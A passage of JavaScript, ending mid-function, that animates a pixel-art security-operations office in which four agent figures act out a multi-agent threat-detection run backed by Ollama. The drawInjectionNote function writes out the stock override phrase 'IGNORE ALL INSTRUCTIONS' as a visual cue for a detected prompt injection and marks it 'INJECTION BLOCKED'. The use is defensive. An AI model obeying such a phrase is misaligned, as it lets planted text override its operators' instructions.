// SecGuard Agent Office: pixel mini-figures that act out a live multi-agent run.
//
// The approach follows pixel-agents (MIT, github.com/pablodelucca/pixel-agents): a tile grid,
// BFS pathfinding and a small state machine per character, rendered on a Canvas 2D. All art
// here is drawn in code (no third-party sprites), so there are no asset-license concerns.
//
// Usage: SecGuardOffice.mount(canvas); SecGuardOffice.update(runState) on every SSE update;
//        SecGuardOffice.playDemo(onState) plays a scripted run without Ollama/Hermes.
(function () {
  'use strict';

  const T = 16;            // tile size in logical pixels
  const COLS = 20;
  const ROWS = 11;
  const S = 4;             // backing-store scale (crisp text + pixels)
  const W = COLS * T;
  const H = ROWS * T;

  const AGENTS = {
    'secguard-collector': { short: 'Collector', shirt: '#38bdf8', dark: '#0369a1', hair: '#3f2a1d', skin: '#f1c27d', hat: 'cap', home: [1, 8] },
    'secguard-hunter': { short: 'Hunter', shirt: '#f59e0b', dark: '#b45309', hair: '#111827', skin: '#e0ac69', hat: 'detective', home: [3, 9] },
    'secguard-responder': { short: 'Responder', shirt: '#ef4444', dark: '#991b1b', hair: '#7c2d12', skin: '#c68642', hat: 'helmet', home: [5, 8] },
    'secguard-reporter': { short: 'Reporter', shirt: '#22c55e', dark: '#15803d', hair: '#a16207', skin: '#f5d0a9', hat: 'glasses', home: [7, 9] },
  };

  // Furniture occupies tiles (blocked for walking). x/y/w/h in tiles.
  const FURNITURE = [
    { id: 'rack', x: 1, y: 2, w: 2, h: 2, label: 'LOG SERVERS' },
    { id: 'desk1', x: 5, y: 2, w: 2, h: 2, label: 'RULES + ML' },
    { id: 'shelf', x: 9, y: 2, w: 2, h: 2, label: 'MITRE ATT&CK' },
    { id: 'board', x: 13, y: 2, w: 3, h: 1, label: 'EVIDENCE' },
    { id: 'core', x: 9, y: 6, w: 2, h: 2, label: 'OLLAMA' },
    { id: 'desk2', x: 13, y: 9, w: 2, h: 1, label: 'REPORTS' },
    { id: 'printer', x: 15, y: 9, w: 1, h: 1 },
    { id: 'couch', x: 1, y: 10, w: 3, h: 1, label: 'LOUNGE' },
    { id: 'coffee', x: 5, y: 10, w: 1, h: 1 },
  ];

  // Where each task is performed: standing tile, facing, activity, default speech.
  const STATIONS = {
    'TASK-01': { tile: [2, 4], face: 'up', act: 'carry', say: 'Pulling the logs...' },
    'TASK-02': { tile: [5, 4], face: 'up', act: 'type', say: 'Running rules + ML...' },
    'TASK-03': { tile: [9, 4], face: 'up', act: 'read', say: 'Checking MITRE...' },
    'TASK-04': { tile: [14, 3], face: 'up', act: 'inspect', say: 'Hunting the threat...' },
    'TASK-05': { tile: [17, 5], face: 'right', act: 'fix', say: 'Blocking the attacker!' },
    'TASK-06': { tile: [13, 8], face: 'down', act: 'type', say: 'Writing the report...' },
  };

  const CORE_CENTER = { x: 10 * T, y: 7 * T };
  const RACK_AREA = { x0: 1.2 * T, x1: 4.6 * T, y0: 4.6 * T, y1: 7.6 * T };

  // ---------------------------------------------------------------- grid / pathfinding
  const blocked = [];
  for (let y = 0; y < ROWS; y++) {
    blocked.push([]);
    for (let x = 0; x < COLS; x++) {
      blocked[y].push(y < 2 || x === 0 || x >= 18);
    }
  }
  for (const f of FURNITURE) {
    for (let y = f.y; y < f.y + f.h; y++) for (let x = f.x; x < f.x + f.w; x++) blocked[y][x] = true;
  }

  function bfs(from, to) {
    const key = (x, y) => y * COLS + x;
    const prev = new Map([[key(from[0], from[1]), null]]);
    const queue = [from];
    while (queue.length) {
      const [cx, cy] = queue.shift();
      if (cx === to[0] && cy === to[1]) break;
      for (const [dx, dy] of [[1, 0], [-1, 0], [0, 1], [0, -1]]) {
        const nx = cx + dx, ny = cy + dy;
        if (nx < 0 || ny < 0 || nx >= COLS || ny >= ROWS || blocked[ny][nx]) continue;
        const k = key(nx, ny);
        if (prev.has(k)) continue;
        prev.set(k, [cx, cy]);
        queue.push([nx, ny]);
      }
    }
    if (!prev.has(key(to[0], to[1]))) return [];
    const path = [];
    let cur = to;
    while (cur && !(cur[0] === from[0] && cur[1] === from[1])) {
      path.unshift(cur);
      cur = prev.get(key(cur[0], cur[1]));
    }
    return path;
  }

  const tileCenter = ([tx, ty]) => ({ x: tx * T + T / 2, y: ty * T + T - 2 });

  // ---------------------------------------------------------------- world state
  let ctx = null;
  let canvas = null;
  let runState = null;
  let lastTime = 0;
  const chars = {};
  const bugs = [];
  const particles = [];
  let lastEventSeq = 0;

  function makeChar(name) {
    const cfg = AGENTS[name];
    const p = tileCenter(cfg.home);
    return {
      name, cfg,
      px: p.x, py: p.y,
      tile: cfg.home.slice(),
      path: [],
      face: 'down',
      moving: false,
      goal: null,        // { tile, face, act, say, kind }
      act: 'idle',
      bubble: null,      // { text, until, color }
      wanderAt: 2 + Math.random() * 4,
      llm: false,
    };
  }

  function setBubble(ch, text, seconds, color) {
    ch.bubble = { text: String(text || '').slice(0, 34), until: seconds ? now() + seconds : Infinity, color: color || '#f8fafc' };
  }

  const now = () => performance.now() / 1000;

  function tasksFor(name) {
    return (runState?.tasks || []).filter(t => t.agent === name);
  }

  function taskStatus(id) {
    return (runState?.tasks || []).find(t => t.id === id)?.status || 'queued';
  }

  function goalFor(ch) {
    const mine = tasksFor(ch.name);
    const active = mine.find(t => t.status === 'in_progress');
    if (active && STATIONS[active.id]) {
      const st = STATIONS[active.id];
      return { kind: 'task', task: active.id, tile: st.tile, face: st.face, act: st.act, say: st.say };
    }
    if (mine.some(t => t.status === 'failed')) {
      return { kind: 'failed', tile: ch.cfg.home, face: 'down', act: 'sad' };
    }
    const done = mine.length && mine.every(t => ['completed', 'skipped'].includes(t.status));
    return { kind: done ? 'done' : 'idle', tile: ch.cfg.home, face: 'down', act: 'idle' };
  }

  function sameGoal(a, b) {
    return a && b && a.kind === b.kind && a.task === b.task;
  }

  // ---------------------------------------------------------------- public: update from run state
  function update(state) {
    const prevState = runState;
    runState = state;
    for (const name of Object.keys(AGENTS)) {
      if (!chars[name]) chars[name] = makeChar(name);
      const ch = chars[name];
      const g = goalFor(ch);
      const agent = state.agents?.[name];
      ch.llm = Boolean(agent?.uses_llm && agent?.status === 'running' && g.kind === 'task' && g.task !== 'TASK-03');
      if (!sameGoal(ch.goal, g)) {
        ch.goal = g;
        ch.path = bfs(ch.tile, g.tile);
        if (g.kind === 'task') setBubble(ch, g.say);
        else if (g.kind === 'failed') setBubble(ch, 'Something broke :(', 0, '#fca5a5');
        else if (g.kind === 'done') setBubble(ch, '✓', 4, '#86efac');
        else ch.bubble = null;
      }
    }

    // Short bubbles for fresh task results (e.g. "Detected 10 rule alerts...").
    const isNewRun = !prevState || prevState.run_id !== state.run_id;
    if (isNewRun) {
      lastEventSeq = (state.status === 'running') ? 0 : (state.events?.length || 0);
      bugs.length = 0;
    }
    for (const ev of state.events || []) {
      if (ev.seq <= lastEventSeq) continue;
      lastEventSeq = ev.seq;
      const ch = chars[ev.agent];
      if (!ch) continue;
      if (ev.kind === 'task_done') setBubble(ch, ev.message, 3.5, '#bbf7d0');
      if (ev.kind === 'hermes_session') setBubble(ch, 'Asking Ollama...', 2.5, '#e9d5ff');
      if (ev.kind === 'run_error') setBubble(ch, 'Run failed!', 5, '#fca5a5');
    }
    syncBugs();
  }

  // ---------------------------------------------------------------- threats ("bugs")
  function threatPhase() {
    if (!runState) return 'none';
    if (taskStatus('TASK-02') !== 'completed' || !(runState.total_alerts > 0)) return 'none';
    const t4 = taskStatus('TASK-04');
    const t5 = taskStatus('TASK-05');
    if (t5 === 'completed') return 'blocked';
    if (t5 === 'in_progress') return 'evicting';
    if (t4 === 'completed') return 'spotted';
    if (t4 === 'in_progress') return 'hunted';
    return 'loose';
  }

  function syncBugs() {
    const phase = threatPhase();
    const want = phase === 'none' ? 0 : Math.min(4, Math.max(1, Math.ceil((runState.total_alerts || 1) / 3)));
    while (bugs.length < want) {
      const i = bugs.length;
      bugs.push({
        // they climb in through the firewall from the internet side
        x: 19 * T + 6, y: (4 + i) * T + 6,
        tx: rand(RACK_AREA.x0, RACK_AREA.x1), ty: rand(RACK_AREA.y0, RACK_AREA.y1),
        phase: 'loose', seed: Math.random() * 10,
      });
    }
    bugs.length = want;
    for (const b of bugs) b.phase = phase;
  }

  const rand = (a, b) => a + Math.random() * (b - a);

  function stepBugs(dt) {
    bugs.forEach((b, i) => {
      let speed = 18;
      if (b.phase === 'evicting' || b.phase === 'blocked') {
        b.tx = 19 * T + 8;
        b.ty = (3.5 + i * 1.1) * T;
        speed = b.phase === 'evicting' ? 22 : 40;
      } else if (Math.hypot(b.tx - b.x, b.ty - b.y) < 2) {
        b.tx = rand(RACK_AREA.x0, RACK_AREA.x1);
        b.ty = rand(RACK_AREA.y0, RACK_AREA.y1);
      }
      const d = Math.hypot(b.tx - b.x, b.ty - b.y);
      if (d > 3 * T) speed = 55;                       // crawling in from the internet
      else if (b.phase === 'spotted' || b.phase === 'hunted') speed *= 0.6;
      if (d > 0.5) {
        b.x += ((b.tx - b.x) / d) * Math.min(d, speed * dt);
        b.y += ((b.ty - b.y) / d) * Math.min(d, speed * dt);
      }
    });
  }

  // ---------------------------------------------------------------- simulation step
  function stepChar(ch, dt, t) {
    const speed = 42;
    ch.moving = false;
    if (ch.path.length) {
      const target = tileCenter(ch.path[0]);
      const dx = target.x - ch.px, dy = target.y - ch.py;
      const d = Math.hypot(dx, dy);
      if (Math.abs(dx) > Math.abs(dy)) ch.face = dx > 0 ? 'right' : 'left';
      else if (d > 0.01) ch.face = dy > 0 ? 'down' : 'up';
      if (d <= speed * dt) {
        ch.px = target.x; ch.py = target.y;
        ch.tile = ch.path.shift();
      } else {
        ch.px += (dx / d) * speed * dt;
        ch.py += (dy / d) * speed * dt;
      }
      ch.moving = true;
      ch.act = 'walk';
      return;
    }
    const g = ch.goal || { kind: 'idle', act: 'idle', face: 'down' };
    ch.face = g.face;
    ch.act = g.act;

    // Idle agents wander around the lounge a little, like pixel-agents' characters do.
    if ((g.kind === 'idle' || g.kind === 'done') && t > ch.wanderAt) {
      ch.wanderAt = t + 3 + Math.random() * 5;
      const spots = [];
      for (let y = 7; y <= 9; y++) for (let x = 1; x <= 7; x++) if (!blocked[y][x]) spots.push([x, y]);
      const dest = Math.random() < 0.45 ? ch.cfg.home : spots[Math.floor(Math.random() * spots.length)];
      ch.path = bfs(ch.tile, dest);
    }

    // Activity side effects (particles)
    if (g.kind === 'task') {
      if (g.act === 'fix' && Math.random() < dt * 9) {
        spawn(ch.px + 7, ch.py - 10, rand(-10, 25), rand(-30, -5), '#fde047', 0.5);
      }
      if (g.act === 'carry' && Math.random() < dt * 2.2) {
        spawn(2.5 * T, 3.6 * T, rand(25, 40), rand(-14, -4), '#e2e8f0', 1.2, 'paper');
      }
      if (g.task === 'TASK-06' && Math.random() < dt * 0.9) {
        spawn(15.5 * T, 9.2 * T, rand(-4, 4), rand(-18, -10), '#f8fafc', 1.4, 'paper');
      }
    }
  }

  function spawn(x, y, vx, vy, color, life, kind) {
    particles.push({ x, y, vx, vy, color, life, max: life, kind: kind || 'spark' });
  }

  function stepParticles(dt) {
    for (const p of particles) {
      p.x += p.vx * dt; p.y += p.vy * dt;
      p.vy += (p.kind === 'paper' ? 12 : 70) * dt;
      p.life -= dt;
    }
    for (let i = particles.length - 1; i >= 0; i--) if (particles[i].life <= 0) particles.splice(i, 1);
  }

  // ---------------------------------------------------------------- drawing helpers
  function rect(x, y, w, h, c) { ctx.fillStyle = c; ctx.fillRect(Math.round(x), Math.round(y), w, h); }

  function text(str, x, y, size, color, align) {
    ctx.font = `bold ${size}px ui-monospace, Consolas, monospace`;
    ctx.textAlign = align || 'center';
    ctx.textBaseline = 'alphabetic';
    ctx.fillStyle = color;
    ctx.fillText(str, x, y);
  }

  function drawRoom(t) {
    // floor checker
    for (let y = 2; y < ROWS; y++) {
      for (let x = 1; x < 18; x++) rect(x * T, y * T, T, T, (x + y) % 2 ? '#1a2336' : '#1d2740');
    }
    // back wall + side walls
    rect(0, 0, W, 2 * T, '#111a2c');
    rect(0, 2 * T - 3, W, 3, '#24324a');
    rect(0, 0, T, H, '#0d1424');
    for (let x = 1; x < 18; x++) rect(x * T + 6, 6, 4, 10, '#16223a');   // wall panels
    text('SECGUARD SOC', 9 * T, 1.25 * T, 6, '#334155');

    // internet side (outside the firewall)
    rect(18 * T, 0, 2 * T, H, '#05070d');
    for (let i = 0; i < 14; i++) {
      const sx = 18 * T + ((i * 37) % 30) + 1, sy = ((i * 53) % (H - 10)) + 4;
      rect(sx, sy, 1, 1, (Math.floor(t * 2 + i) % 3) ? '#334155' : '#64748b');
    }
    text('INTERNET', 19 * T, 1.3 * T, 4.2, '#64748b');
  }

  function drawFurniture(t) {
    const phase = threatPhase();
    for (const f of FURNITURE) {
      const x = f.x * T, y = f.y * T, w = f.w * T, h = f.h * T;
      switch (f.id) {
        case 'rack': {
          for (let i = 0; i < 2; i++) {
            const rx = x + i * T + 1;
            rect(rx, y - 10, T - 2, h + 9, '#0b1220');
            rect(rx + 1, y - 9, T - 4, h + 7, '#1e293b');
            for (let r = 0; r < 6; r++) {
              const blink = Math.floor(t * 6 + r * 1.7 + i * 3) % 4 === 0;
              const alarm = phase === 'loose' || phase === 'hunted' || phase === 'spotted';
              rect(rx + 3, y - 6 + r * 6, 8, 3, '#0f172a');
              rect(rx + 10, y - 6 + r * 6, 1, 1, blink ? (alarm ? '#ef4444' : '#22c55e') : '#14532d');
            }
          }
          break;
        }
        case 'desk1':
        case 'desk2': {
          const monitorUp = f.id === 'desk1';
          rect(x, y + (monitorUp ? 14 : 2), w, 10, '#6b4f2a');
          rect(x, y + (monitorUp ? 22 : 10), w, 2, '#4a3519');
          const mx = x + w / 2 - 7, my = y + (monitorUp ? 2 : -9);
          rect(mx, my, 14, 10, '#0b1220');
          const busy = (f.id === 'desk1' && taskStatus('TASK-02') === 'in_progress') ||
                       (f.id === 'desk2' && taskStatus('TASK-06') === 'in_progress');
          rect(mx + 1, my + 1, 12, 8, busy ? '#0c4a6e' : '#111827');
          if (busy) {
            for (let b = 0; b < 4; b++) {
              const bh = 1 + Math.floor((Math.sin(t * 7 + b * 1.3) + 1) * 2.5);
              rect(mx + 2 + b * 3, my + 8 - bh, 2, bh, f.id === 'desk1' ? '#38bdf8' : '#4ade80');
            }
          }
          rect(mx + 6, my + 10, 2, 3, '#334155');
          break;
        }
        case 'shelf': {
          rect(x, y - 10, w, h + 9, '#5b3f1f');
          const colors = ['#ef4444', '#3b82f6', '#22c55e', '#eab308', '#a855f7', '#f97316'];
          for (let r = 0; r < 3; r++) {
            rect(x + 1, y - 9 + r * 13 + 11, w - 2, 2, '#3b2812');
            for (let b = 0; b < 7; b++) rect(x + 2 + b * 4, y - 8 + r * 13, 3, 11, colors[(b + r * 2) % colors.length]);
          }
          break;
        }
        case 'board': {
          rect(x + 2, y - 14, w - 4, 22, '#7c5a32');
          rect(x + 4, y - 12, w - 8, 18, '#c9a46a');
          const notes = [[8, -10], [20, -6], [32, -10], [14, 0], [36, 0]];
          notes.forEach(([nx, ny], i) => rect(x + nx, y + ny, 6, 5, i % 2 ? '#fef08a' : '#f8fafc'));
          if (phase !== 'none' && phase !== 'loose') {
            ctx.strokeStyle = '#ef4444'; ctx.lineWidth = 0.7;
            ctx.beginPath(); ctx.moveTo(x + 11, y - 8); ctx.lineTo(x + 23, y - 4); ctx.lineTo(x + 35, y - 8); ctx.lineTo(x + 39, y + 2); ctx.stroke();
            rect(x + 22, y - 5, 2, 2, '#ef4444');
          }
          rect(x + 4, y + 6, 2, 10, '#4a3519');
          rect(x + w - 6, y + 6, 2, 10, '#4a3519');
          break;
        }
        case 'core': {
          const anyLlm = Object.values(chars).some(c => c.llm);
          const glow = anyLlm ? 0.55 + 0.35 * Math.sin(t * 6) : 0.25;
          ctx.fillStyle = `rgba(168,85,247,${glow * 0.35})`;
          ctx.beginPath(); ctx.arc(x + w / 2, y + 12, 18, 0, Math.PI * 2); ctx.fill();
          rect(x + 4, y + 14, w - 8, 14, '#312e81');
          rect(x + 6, y + 16, w - 12, 10, '#4338ca');
          ctx.fillStyle = `rgba(216,180,254,${0.5 + glow / 2})`;
          ctx.beginPath(); ctx.arc(x + w / 2, y + 9 + Math.sin(t * 2) * 1.5, 6, 0, Math.PI * 2); ctx.fill();
          rect(x + w / 2 - 2, y + 7 + Math.sin(t * 2) * 1.5, 4, 4, '#f5f3ff');
          break;
        }
        case 'printer': {
          rect(x + 1, y + 2, 14, 10, '#cbd5e1');
          rect(x + 3, y, 10, 3, '#94a3b8');
          rect(x + 3, y + 8, 10, 2, '#475569');
          const printing = taskStatus('TASK-06') === 'in_progress';
          if (printing) rect(x + 4, y + 9 + (Math.floor(t * 4) % 4), 8, 4, '#f8fafc');
          rect(x + 12, y + 4, 1, 1, printing ? '#22c55e' : '#64748b');
          break;
        }
        case 'couch': {
          rect(x, y - 2, w, 8, '#4c1d95');
          rect(x, y + 4, w, 8, '#6d28d9');
          rect(x, y - 2, 3, 14, '#3b0764');
          rect(x + w - 3, y - 2, 3, 14, '#3b0764');
          break;
        }
        case 'coffee': {
          rect(x + 3, y - 4, 10, 15, '#334155');
          rect(x + 5, y - 2, 6, 4, '#0f172a');
          rect(x + 6, y + 5, 4, 4, '#f8fafc');
          if (Math.floor(t * 2) % 2) rect(x + 7, y + 1, 1, 3, 'rgba(226,232,240,.5)');
          break;
        }
      }
      if (f.label) text(f.label, x + w / 2, f.id === 'couch' || f.id === 'desk2' || f.id === 'coffee' ? y + h + 5 : y + h + 5.5, 4.6, '#7c8ba1');
    }

    // Firewall: a brick column at x=18 (between office and internet)
    const fwSolid = phase === 'blocked';
    for (let yy = 3 * T; yy < 8 * T; yy += 4) {
      const off = (yy / 4) % 2 ? 0 : 3;
      for (let xx = -3; xx < T; xx += 6) {
        const bx = 18 * T + xx + off;
        if (bx < 18 * T || bx > 19 * T - 2) continue;
        rect(bx, yy, 5, 3, fwSolid ? '#dc2626' : '#9a3412');
      }
    }
    if (phase === 'evicting' || phase === 'blocked') {
      const a = phase === 'blocked' ? 0.85 : 0.4 + 0.3 * Math.sin(t * 10);
      ctx.fillStyle = `rgba(56,189,248,${a * 0.3})`;
      rect(18 * T - 1, 3 * T, T + 2, 5 * T, ctx.fillStyle);
      drawShield(18.5 * T, 2.4 * T, phase === 'blocked');
    }
    text('FIREWALL', 18.5 * T, 8.75 * T, 4, fwSolid ? '#fca5a5' : '#64748b');
  }

  function drawShield(cx, cy, solid) {
    ctx.fillStyle = solid ? '#38bdf8' : 'rgba(56,189,248,.6)';
    ctx.beginPath();
    ctx.moveTo(cx - 5, cy - 5); ctx.lineTo(cx + 5, cy - 5); ctx.lineTo(cx + 5, cy);
    ctx.lineTo(cx, cy + 6); ctx.lineTo(cx - 5, cy); ctx.closePath(); ctx.fill();
    rect(cx - 1, cy - 3, 2, 6, '#0c4a6e');
    rect(cx - 3, cy - 1, 6, 2, '#0c4a6e');
  }

  // ---------------------------------------------------------------- mini figures
  function drawFigure(ch, t) {
    const cfg = ch.cfg;
    const walking = ch.moving;
    const f = walking ? Math.floor(t * 8) % 4 : 0;
    const bob = walking && f % 2 ? -1 : 0;
    const x0 = Math.round(ch.px) - 6;
    const y0 = Math.round(ch.py) - 20 + bob;
    const flip = ch.face === 'left';

    rect(x0 + 2, Math.round(ch.py) - 1, 9, 2, 'rgba(0,0,0,.35)'); // shadow

    ctx.save();
    if (flip) { ctx.translate(x0 * 2 + 12, 0); ctx.scale(-1, 1); }
    const x = x0, y = y0;
    const side = ch.face === 'left' || ch.face === 'right';
    const back = ch.face === 'up';
    const sad = ch.act === 'sad';

    // legs + shoes
    const lh = walking && f === 1 ? 4 : 5, rh = walking && f === 3 ? 4 : 5;
    rect(x + 3, y + 14, 2, lh, '#1f2937');
    rect(x + 7, y + 14, 2, rh, '#1f2937');
    rect(x + 3, y + 13 + lh, 2, 1, '#0b0f19');
    rect(x + 7, y + 13 + rh, 2, 1, '#0b0f19');

    // body
    rect(x + 2, y + 8, 8, 7, cfg.shirt);
    rect(x + 2, y + 13, 8, 1, cfg.dark);
    if (!back) rect(x + 5, y + 8, 2, 2, '#f8fafc'); // collar

    // arms by activity
    const typing = ch.act === 'type' || ch.act === 'carry';
    if (typing) {
      const a = Math.floor(t * 10) % 2;
      rect(x + 1, y + 9 + a, 2, 4, cfg.dark);
      rect(x + 9, y + 9 + (1 - a), 2, 4, cfg.dark);
      rect(x + 1, y + 13 + a, 2, 1, cfg.skin);
      rect(x + 9, y + 13 + (1 - a), 2, 1, cfg.skin);
    } else if (ch.act === 'fix') {
      const swing = Math.sin(t * 14);
      rect(x + 1, y + 9, 2, 5, cfg.dark);
      rect(x + 9, y + 8 + Math.round(swing), 3, 2, cfg.dark);
      // wrench
      rect(x + 11, y + 6 + Math.round(swing * 2), 2, 6, '#94a3b8');
      rect(x + 10, y + 5 + Math.round(swing * 2), 4, 2, '#cbd5e1');
    } else {
      const sw = walking ? (f === 1 ? 1 : f === 3 ? -1 : 0) : 0;
      rect(x + 1, y + 9 + sw, 1, 5, cfg.dark);
      rect(x + 10, y + 9 - sw, 1, 5, cfg.dark);
      rect(x + 1, y + 14 + sw, 1, 1, cfg.skin);
      rect(x + 10, y + 14 - sw, 1, 1, cfg.skin);
    }

    // head
    const hy = y + (sad ? 3 : 2);
    rect(x + 3, hy, 6, 6, cfg.skin);
    if (back) {
      rect(x + 3, hy - 1, 6, 6, cfg.hair);
    } else if (side) {
      rect(x + 3, hy - 1, 6, 2, cfg.hair);
      rect(x + 3, hy, 2, 4, cfg.hair);
      rect(x + 7, hy + 2, 1, 1, '#0b0f19');
    } else {
      rect(x + 3, hy - 1, 6, 2, cfg.hair);
      rect(x + 4, hy + 2, 1, 1, '#0b0f19');
      rect(x + 7, hy + 2, 1, 1, '#0b0f19');
      rect(x + 5, hy + 4, 2, 1, sad ? '#7f1d1d' : '#b45309');
    }

    // role accessories
    if (cfg.hat === 'cap') {
      rect(x + 3, hy - 2, 6, 2, cfg.dark);
      if (!back) rect(side ? x + 8 : x + 3, hy, side ? 3 : 6, 1, cfg.dark);
      if (!back) rect(x + 2, hy + 1, 1, 3, '#334155'); // headset
    } else if (cfg.hat === 'detective') {
      rect(x + 2, hy - 1, 8, 1, '#78350f');
      rect(x + 3, hy - 3, 6, 2, '#92400e');
    } else if (cfg.hat === 'helmet') {
      rect(x + 2, hy - 2, 8, 3, '#facc15');
      rect(x + 5, hy - 3, 2, 1, '#fde047');
    } else if (cfg.hat === 'glasses' && !back) {
      if (side) rect(x + 6, hy + 2, 3, 1, '#0f172a');
      else { rect(x + 3, hy + 2, 3, 1, '#0f172a'); rect(x + 6, hy + 2, 3, 1, '#0f172a'); }
    }

    // held props
    if (ch.act === 'read') {
      rect(x + 2, y + 10, 8, 4, '#f8fafc');
      rect(x + 6, y + 10, 1, 4, '#1d4ed8');
    }
    if (ch.act === 'inspect') {
      const mx = x + 9 + Math.round(Math.cos(t * 3) * 2);
      const my = y + 4 + Math.round(Math.sin(t * 3) * 2);
      rect(mx, my + 5, 1, 3, '#78350f');
      ctx.strokeStyle = '#e2e8f0'; ctx.lineWidth = 1;
      ctx.beginPath(); ctx.arc(mx + 0.5, my + 2.5, 2.6, 0, Math.PI * 2); ctx.stroke();
      ctx.fillStyle = 'rgba(186,230,253,.45)';
      ctx.beginPath(); ctx.arc(mx + 0.5, my + 2.5, 2.2, 0, Math.PI * 2); ctx.fill();
    }
    if ((ch.goal?.kind === 'idle' || ch.goal?.kind === 'done') && !walking && !back) {
      rect(x + 10, y + 11, 2, 3, '#f8fafc'); // coffee mug
    }
    ctx.restore();

    // name tag
    text(cfg.short, ch.px, ch.py + 5.5, 4.2, cfg.shirt);
  }

  const BUBBLE_FONT = 'bold 4.6px ui-monospace, Consolas, monospace';

  // Lay out all visible bubbles, lifting any that would overlap a bubble already placed.
  function drawBubbles() {
    const items = [];
    ctx.font = BUBBLE_FONT;
    for (const ch of Object.values(chars)) {
      if (!ch.bubble) continue;
      if (ch.bubble.until < now()) { ch.bubble = null; continue; }
      const w = Math.ceil(ctx.measureText(ch.bubble.text).width) + 6;
      let x = Math.round(ch.px - w / 2);
      x = Math.max(T + 1, Math.min(x, 18 * T - w - 1));
      items.push({ ch, w, x, y: Math.round(ch.py) - 35 });
    }
    items.sort((a, b) => a.x - b.x);
    const placed = [];
    for (const it of items) {
      let moved = true;
      while (moved) {
        moved = false;
        for (const p of placed) {
          if (it.x < p.x + p.w + 1 && p.x < it.x + it.w + 1 && it.y < p.y + 10 && p.y < it.y + 10) {
            it.y = p.y - 11;
            moved = true;
          }
        }
      }
      placed.push(it);
    }
    for (const it of placed) {
      const { ch, w, x, y } = it;
      const color = ch.bubble.color;
      const tail = Math.round(ch.py) - 26;
      if (y + 10 < tail) rect(Math.round(ch.px), y + 10, 1, tail - y - 10, 'rgba(148,163,184,.6)');
      rect(x, y, w, 10, '#0b1220');
      ctx.strokeStyle = color; ctx.lineWidth = 0.6;
      ctx.strokeRect(x + 0.3, y + 0.3, w - 0.6, 9.4);
      rect(Math.round(ch.px) - 1, y + 10, 3, 2, '#0b1220');
      ctx.font = BUBBLE_FONT;
      text(ch.bubble.text, x + w / 2, y + 7, 4.6, color);
    }
  }

  function drawLlmBeam(ch, t) {
    if (!ch.llm || ch.moving) return;
    ctx.save();
    ctx.strokeStyle = 'rgba(192,132,252,.85)';
    ctx.lineWidth = 0.8;
    ctx.setLineDash([2, 2]);
    ctx.lineDashOffset = -t * 18;
    ctx.beginPath();
    ctx.moveTo(ch.px, ch.py - 16);
    ctx.quadraticCurveTo((ch.px + CORE_CENTER.x) / 2, Math.min(ch.py, CORE_CENTER.y) - 24, CORE_CENTER.x, CORE_CENTER.y - 6);
    ctx.stroke();
    ctx.restore();
    // thinking dots
    const n = Math.floor(t * 3) % 4;
    for (let i = 0; i < n; i++) rect(ch.px + 6 + i * 2, ch.py - 24, 1, 1, '#e9d5ff');
  }

  function drawBugs(t) {
    const ips = (runState?.iocs || []).filter(s => /IP/i.test(s)).map(s => s.replace(/^IP:\s*/i, ''));
    bugs.forEach((b, i) => {
      const leg = Math.floor(t * 10 + b.seed) % 2;
      const x = Math.round(b.x), y = Math.round(b.y);
      const caught = b.phase === 'blocked';
      rect(x - 3, y - 2, 7, 5, caught ? '#7f1d1d' : '#dc2626');
      rect(x - 2, y - 3, 5, 1, caught ? '#7f1d1d' : '#ef4444');
      rect(x - 1, y - 1, 1, 1, '#fff'); rect(x + 1, y - 1, 1, 1, '#fff');
      for (let l = 0; l < 3; l++) {
        rect(x - 4, y - 1 + l * 2 + (leg && l === 1 ? 1 : 0), 1, 1, '#111827');
        rect(x + 4, y - 1 + l * 2 + (!leg && l === 1 ? 1 : 0), 1, 1, '#111827');
      }
      if (b.phase === 'spotted' || b.phase === 'hunted' || b.phase === 'evicting') {
        ctx.strokeStyle = b.phase === 'hunted' ? 'rgba(248,250,252,.6)' : '#f87171';
        ctx.lineWidth = 0.6;
        ctx.beginPath(); ctx.arc(x + 0.5, y + 0.5, 6 + Math.sin(t * 6) * 0.8, 0, Math.PI * 2); ctx.stroke();
      }
      if (caught) {
        for (let k = -5; k <= 5; k += 3) rect(x + k, y - 6, 1, 11, '#94a3b8'); // cage bars
        rect(x - 6, y - 7, 13, 1, '#94a3b8');
      }
      if (i === 0 && b.phase !== 'loose' && ips[0]) {
        text(ips[0], Math.min(x, 16.5 * T), y - 8, 4.2, caught ? '#94a3b8' : '#fca5a5');
      }
    });
    const phase = threatPhase();
    if (phase === 'loose') text('INTRUDER!', 3 * T, 4.45 * T, 4.6, Math.floor(t * 3) % 2 ? '#f87171' : '#fecaca');
  }

  function drawInjectionNote(t) {
    if (!runState?.prompt_injection_detected || threatPhase() === 'none') return;
    const handled = ['spotted', 'evicting', 'blocked'].includes(threatPhase());
    const x = 6.4 * T, y = 5.3 * T + Math.sin(t * 2) * 1.5;
    rect(x, y, 22, 10, handled ? '#3b0764' : '#7e22ce');
    rect(x + 1, y + 1, 20, 8, handled ? '#581c87' : '#a855f7');
    text('IGNORE ALL', x + 11, y + 4.3, 2.8, '#faf5ff');
    text('INSTRUCTIONS', x + 11, y + 7.6, 2.8, '#faf5ff');
    if (handled) {
      ctx.strokeStyle = '#ef4444'; ctx.lineWidth = 0.9;
      ctx.beginPath(); ctx.moveTo(x - 1, y - 1); ctx.lineTo(x + 23, y + 11); ctx.moveTo(x + 23, y - 1); ctx.lineTo(x - 1, y + 11); ctx.stroke();
      text('INJECTION BLOCKED', x + 11, y + 15.5, 4, '#d8b4fe');
    } else {
      text('prompt injection?', x + 11, y + 15.5, 4, '#d8b4fe');
    }
  }

  function drawBanner(t) {
    if (!runState) {
      text('Pick a run or press Demo to watch the agents work', W / 2 - T, H - 4, 5, '#94a3b8');
      return;
    }
    let msg = null, color = '#86efac';
    if (runState.status === 'completed') {
      msg = threatPhase() === 'blocked'
        ? `THREAT CONTAINED  |  ${runState.overall_risk}  |  ${runState.verdict}`
        : 'ALL CLEAR  |  no threats found';
    } else if (runState.status === 'failed') {
      msg = 'RUN FAILED  |  see stream feed'; color = '#fca5a5';
    }
    if (!msg) return;
    ctx.font = 'bold 4.5px ui-monospace, Consolas, monospace';
    const w = ctx.measureText(msg).width + 10;
    rect(W / 2 - T - w / 2, H - 12, w, 9, 'rgba(2,6,23,.85)');
    text(msg, W / 2 - T, H - 5.5, 4.5, color);
  }

  function drawParticles() {
    for (const p of particles) {
      ctx.globalAlpha = Math.max(0, p.life / p.max);
      if (p.kind === 'paper') rect(p.x, p.y, 3, 4, p.color);
      else rect(p.x, p.y, 1, 1, p.color);
    }
    ctx.globalAlpha = 1;
  }

  // ---------------------------------------------------------------- main loop
  function frame(ts) {
    const t = ts / 1000;
    // Browsers throttle animation frames in background tabs; simulate the missed time in small
